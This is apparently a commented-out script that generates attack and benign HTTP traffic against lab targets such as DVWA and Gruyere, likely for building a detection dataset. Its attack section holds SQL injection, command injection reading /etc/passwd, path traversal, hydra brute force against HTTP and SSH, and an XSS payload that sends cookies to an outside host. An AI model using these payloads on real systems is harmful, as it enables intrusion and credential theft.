#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/vulnerabilities/sqli/?id=or+1%3D1%3B&Submit=Submit' -H $'Cookie: security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5' \
#     $'http://192.168.56.113/dvwa/vulnerabilities/sqli/?id=%27+or+1%3D1%3B&Submit=Submit'


# # HTTP Remote code execution
# curl -i -s -k --interface eth1:0 -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/vulnerabilities/csrf/' -H $'Cookie: security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=edgpn41qu61qmteenfnb82m9r5' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=edgpn41qu61qmteenfnb82m9r5' \
#     $'http://192.168.56.113/dvwa/vulnerabilities/exec/'
# curl -i -s -k --interface $A1i -X $'POST' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 51' -H $'Origin: http://192.168.56.113' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/vulnerabilities/exec/' -H $'Cookie: security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=edgpn41qu61qmteenfnb82m9r5' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=edgpn41qu61qmteenfnb82m9r5' \
#     --data-binary $'ip=8.8.8.8+%7C%7C+cat+%2Fetc%2Fpasswd&submit=submit' \
#     $'http://192.168.56.113/dvwa/vulnerabilities/exec/'

# #Local File Inclusion
# curl -i -s -k --interface $A1i -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/vulnerabilities/brute/?username=hello&password=hello&Login=Login' -H $'Cookie: security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=edgpn41qu61qmteenfnb82m9r5' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=edgpn41qu61qmteenfnb82m9r5' \
#     $'http://192.168.56.113/dvwa/vulnerabilities/fi/?page=include.php'
# curl -i -s -k --interface eth1:0 -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=edgpn41qu61qmteenfnb82m9r5' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'security=low; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=edgpn41qu61qmteenfnb82m9r5' \
#     $'http://192.168.56.113/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd'



# #HTTP Brute force
# hydra -l admin -P /usr/share/wordlists/rockyou1000.txt $OWASP http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login#:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5"


# #SSH Brute-force
# hydra -l root -P /usr/share/wordlists/rockyou1000.txt $OWASP ssh

#gruyere
# curl -i -s -k --interface $A1i -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/login' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=' \
#     $'http://192.168.56.113/1142014131/login?uid=minionlord&pw=minionlord'
# curl -i -s -k --interface $A1i -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/newsnippet.gtl' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=11314643|minionlord||author' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=11314643|minionlord||author' \
#     $'http://192.168.56.113/1142014131/newsnippet2?snippet=%3Cimg+src%3Derr+onerror%3Dalert%281%29+%2F%3E'

# curl -i -s -k --interface $A1i -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/newsnippet.gtl' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=11314643|minionlord||author' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600; GRUYERE=11314643|minionlord||author' \
#     $'http://192.168.56.113/1142014131/newsnippet2?snippet=%3Cimg+src%3D%22troolll%22+onerror%3D%27minion+%3D+new+XMLHttpRequest%3B+minion.open%28%22GET%22%2C+%22https%3A%2F%2Fgoogle-gruyere.appspot.com%2F624436123596484915070997286433425769351%2Fnewsnippet2%3Fsnippet%3D%3Cimg+src%3D%22https%3A%2F%2Fgoogle-gruyere.appspot.com%2F624436123596484915070997286433425769351%2Fminionlord%2Fhaxxed.png%22%2F%3E%22%29%3B+minion.setRequestHeader%28%22Cookie%22%2C+document.cookie%29%3B+minion.send%28%29%3B%27%2F%3E'
























############### normal traffic


# # LSA

# curl -i -s -k -X $'GET' \
#     -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'If-Modified-Since: Sun, 06 Aug 2017 05:02:15 GMT' -H $'If-None-Match: \"8ce8-5560ea23d23c0-gzip\"' \
#     $'http://lsa/'
# curl -i -s -k -X $'GET' \
#     -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
#     $'http://lsa/Backnode_files/jquery.js'
# curl -i -s -k -X $'GET' \
#     -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
#     $'http://lsa/Backnode_files/jquery-ui.js'
# curl -i -s -k -X $'GET' \
#     -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
#     $'http://lsa/Backnode_files/pageable.js'
# curl -i -s -k -X $'GET' \
#     -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
#     $'http://lsa/Backnode_files/front-end.js'
# curl -i -s -k -X $'GET' \
#     -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: image/webp,*/*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://lsa/' \
#     $'http://lsa/libs/templates/silex-templates/online-service/assets/background_header.jpg'
# curl -i -s -k -X $'GET' \
#     -H $'Host: lsa' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: image/webp,*/*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' \
#     $'http://lsa/favicon.ico'




# ZC2

# curl -i -s -k -X $'GET' \
#     -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
#     -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
#     $'http://zc2/'
# curl -i -s -k -X $'GET' \
#     -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
#     -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
#     $'http://zc2/vendor/jquery/jquery.min.js'
# curl -i -s -k -X $'GET' \
#     -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
#     -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
#     $'http://zc2/vendor/bootstrap/js/bootstrap.min.js'
# curl -i -s -k -X $'GET' \
#     -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
#     -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
#     $'http://zc2/vendor/scrollreveal/scrollreveal.min.js'
# curl -i -s -k -X $'GET' \
#     -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
#     -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
#     $'http://zc2/vendor/magnific-popup/jquery.magnific-popup.min.js'
# curl -i -s -k -X $'GET' \
#     -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
#     -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
#     $'http://zc2/js/creative.min.js'
# curl -i -s -k -X $'GET' \
#     -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: image/webp,*/*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Pragma: no-cache' -H $'Cache-Control: no-cache' \
#     -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
#     $'http://zc2/favicon.ico'
# curl -i -s -k -X $'GET' \
#     -H $'Host: zc2' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://zc2/' -H $'Cookie: PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'PHPSESSID=0dugu6r5gtdipk9aq4pf2hhmk5' \
#     $'http://zc2/view.php?page=tools.html'
# curl -i -s -k -X $'GET' \
#     -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.108/' -H $'Cookie: PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' \
#     $'http://192.168.56.108/phpMyAdmin/'



# # msf

# curl -i -s -k -X $'GET' \
#     -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \
#     $'http://192.168.56.108/'
# curl -i -s -k -X $'GET' \
#     -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.108/' -H $'Upgrade-Insecure-Requests: 1' \
#     $'http://192.168.56.108/twiki/'
# curl -i -s -k -X $'GET' \
#     -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.108/' -H $'Upgrade-Insecure-Requests: 1' \
#     $'http://192.168.56.108/dvwa/'
# curl -i -s -k -X $'GET' \
#     -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.108/dvwa/login.php' -H $'Connection: close' -H $'Cookie: security=high; PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'security=high; PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' \
#     $'http://192.168.56.108/dvwa/login.php'
# curl -i -s -k -X $'GET' \
#     -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.108/dvwa/index.php' -H $'Cookie: security=high; PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'security=high; PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' \
#     $'http://192.168.56.108/dvwa/vulnerabilities/csrf/'
# curl -i -s -k -X $'GET' \
#     -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.108/dvwa/vulnerabilities/csrf/' -H $'Cookie: security=high; PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'security=high; PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' \
#     $'http://192.168.56.108/dvwa/vulnerabilities/sqli_blind/'
# curl -i -s -k -X $'GET' \
#     -H $'Host: 192.168.56.108' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.108/dvwa/vulnerabilities/sqli_blind/' -H $'Cookie: security=high; PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'security=high; PHPSESSID=1aade7ff37fe2c2a50c3adf7dc2a9837' \
#     $'http://192.168.56.108/dvwa/vulnerabilities/fi/?page=include.php'


# # owasp

# curl -i -s -k -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/vulnerabilities/brute/' -H $'Cookie: security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' \
#     $'http://192.168.56.113/dvwa/vulnerabilities/sqli/'
# curl -i -s -k -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/index.php' -H $'Cookie: security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' \
#     $'http://192.168.56.113/dvwa/vulnerabilities/brute/'
# curl -i -s -k -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/dvwa/index.php' -H $'Cookie: security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' \
#     -b $'security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' \
#     $'http://192.168.56.113/dvwa/dvwa/js/dvwaPage.js'
# curl -i -s -k -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/dvwa/login.php' -H $'Connection: close' -H $'Cookie: security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'security=low; tz_offset=-21600; PHPSESSID=rmbli12b7blmrubjjehghtrqp6; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada' \
#     $'http://192.168.56.113/dvwa/index.php'
# curl -i -s -k -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/' -H $'Connection: close' -H $'Cookie: tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'tz_offset=-21600' \
#     $'http://192.168.56.113/dvwa/'



# #gruyere
# curl -i -s -k --interface $U1i -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
#     $'http://192.168.56.113/gruyere/'
# curl -i -s -k --interface $U1i -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://192.168.56.113/' -H $'Connection: close' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' -H $'Upgrade-Insecure-Requests: 1' \
#     -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
#     $'http://192.168.56.113/1142014131/'
# curl -i -s -k --interface $U1i -X $'GET' \
#     -H $'Host: 192.168.56.113' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Referer: http://192.168.56.113/1142014131/' -H $'Cookie: acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
#     -b $'acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada; PHPSESSID=irbv8u8jrccv9lqddespnqeqd5; d5a4bd280a324d2ac98eb2c0fe58b9e0=cqhuisl9ub9fh5hhs62vq6om54; tz_offset=-21600' \
#     $'http://192.168.56.113/1142014131/lib.js'

# curl -i -s -k --interface $U1i -X $'GET' \
